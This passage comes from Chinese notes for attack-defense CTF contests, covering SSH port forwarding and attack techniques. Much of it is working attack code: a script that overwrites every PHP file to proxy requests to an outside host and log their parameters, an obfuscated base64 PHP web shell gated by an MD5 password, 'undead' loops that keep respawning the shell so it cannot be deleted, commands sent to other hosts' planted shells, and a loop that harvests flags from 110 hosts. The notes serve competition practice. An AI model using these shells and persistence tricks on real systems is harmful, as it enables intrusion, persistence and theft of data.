...
**本地转发**：
连上靶机，再从靶机连接kali(192.168.80.196)的新建用户，并将靶机1080端口转到kali的80,实际测试可能是关掉apache，再把本机80转出去(机器上分配了一个 socket 侦听 port 端口, 一旦这个端口上有了连接, 该连接就经过安全通道转发出去, 同时远程主机和 host 的 hostport 端口建立连接. 可以在配置文件中指定端口的转发. 只有 root 才能转发特权端口. )：
**`Linux下默认普通用户是不能占用1024以下的特权端口的`**
```
ssh -g -L 1080:192.168.80.196:80 123@192.168.80.196
```
(-g 允许远程主机连接到建立的转发的端口，如果不加这个参数，只允许本地主机建立连接)
**远程转发**
- `ssh -g -R <local port>:<remote host>:<remote port> <SSH hostname>`
将ssh服务器8080端口转到本地80端口：
```
ssh -g -R 8080:127.0.0.1:80 123@192.168.80.196
```


从我们的靶机连接kali的ssh，将靶机的80映射到kali的80，源码放到kali。

### 权限很低的流量转发+日志拦截
```
hack@36800769995c:/var/www/html$ cat /tmp/1.php
<?php
echo file_get_contents("http://172.16.2.234:9090".$_SERVER["REQUEST_URI"]);
file_put_contents("/var/www/html/123.txt",$_SERVER["REQUEST_URI"].PHP_EOL,FILE_APPEND);

foreach($_REQUEST as $key=>$value){
file_put_contents("/var/www/html/log.txt",$key."=".$value.",",FILE_APPEND);
}
file_put_contents("/var/www/html/log.txt",PHP_EOL,FILE_APPEND);
?>


for i in `grep p -lr|grep ".php"`;do echo $i;cat /tmp/1.php > $i;done
```


## 先准备一款只能被自己利用的一句话，如md5加密的马子
```
root@kali:/tmp/2/html# echo -n v5est0r|md5sum  #一定要-n去掉echo输出的换行
...
base64 .index.php
PD9waHAgJGE9InMiLiJ5Ii4ic3QiLiJlbSI7aWYgKG1kNSgkX1BPU1RbMl0pPT09IjEwOTcyZDcxOGMyMWZkYzg3MThlZmJhYThlNjc3NDBlIil7JGEoJF9QT1NUWzFdKTt9Pz4K

<?php $a="e"."va"."l";if (md5($_POST[2])==="10972d718c21fdc8718efbaa8e67740e"){$a($_POST[3]);}?>
PD9waHAgJGE9ImUiLiJ2YSIuImwiO2lmIChtZDUoJF9QT1NUWzJdKT09PSIxMDk3MmQ3MThjMjFmZGM4NzE4ZWZiYWE4ZTY3NzQwZSIpeyRhKCRfUE9TVFszXSk7fT8+

system: POST:2=v5est0r&1=cat /flag.txt
eval: POST:2=v5est0r&3=system("cat /flag.txt");
...
命令执行，每分钟换文件名，防删：
2=while true;do a=`date +%M`;echo PD9waHAgJGE9InMiLiJ5Ii4ic3QiLiJlbSI7aWYgKG1kNSgkX1BPU1RbMl0pPT09IjEwOTcyZDcxOGMyMWZkYzg3MThlZmJhYThlNjc3NDBlIil7JGEoJF9QT1NUWzFdKTt9Pz4K|base64 -d > .index$a.php;chmod 444 .index$a.php;done

命令执行，每秒换文件名，防删：
2=while true;do a=`date +%s`;echo PD9waHAgJGE9InMiLiJ5Ii4ic3QiLiJlbSI7aWYgKG1kNSgkX1BPU1RbMl0pPT09IjEwOTcyZDcxOGMyMWZkYzg3MThlZmJhYThlNjc3NDBlIil7JGEoJF9QT1NUWzFdKTt9Pz4K|base64 -d > .index$a.php;chmod 444 .index$a.php;done
```
### 当前秒时间戳+md5加密文件名不死马(代码执行)：
```
3=while (1){file_put_contents(".".md5(time()).".php",base64_decode("PD9waHAgJGE9InMiLiJ5Ii4ic3QiLiJlbSI7aWYgKG1kNSgkX1BPU1RbMl0pPT09IjEwOTcyZDcxOGMyMWZkYzg3MThlZmJhYThlNjc3NDBlIil7JGEoJF9QT1NUWzFdKTt9Pz4K"));sleep(1);};
```
```
php -r "echo md5(time());";echo
5fef77c04ea24679d1ab7d7c3b29ffb0

.5fef77c04ea24679d1ab7d7c3b29ffb0.php
...
根据日志发现攻击日志。
```
while true;do echo test >/var/www/html/shell.php;chmod 000 /var/www/html/shell.php;done &

while true;do curl "http://172.16.2.234:8051/.2.php" -d "1=echo sb > xvwa/vulnerabilities/cmdi/bird1.php;chmod 444 xvwa/vulnerabilities/cmdi/bird1.php";done
```
...
批量GET FLAG：
```
//变量名外面的花括号是可选的，加花括号是为了帮助解释器识别变量的边界，防止这种：$i123,要写成${i}123
for i in {1..110};do echo 172.16.${i}.234/.222.php -d "1=system('cat /fla*;echo  ');" --max-time 2;done|grep 172.16
```
```
#!/bin/bash
for i in {1..3}
...
4:dasdafqqwfwef
5:qwfqwfqwffewf
root@kali:~# for i in `awk -F: '{print "ip=192.168.1."$1"&flag="$2}' 1.txt`;do echo $i;done
ip=192.168.1.1&flag=sss1fqwqfwfqw
ip=192.168.1.2&flag=ssss2qwfqfiss
ip=192.168.1.3&flag=ssss3fqwqwfwf
ip=192.168.1.4&flag=dasdafqqwfwef
ip=192.168.1.5&flag=qwfqwfqwffewf
```
### 日志干扰法
```
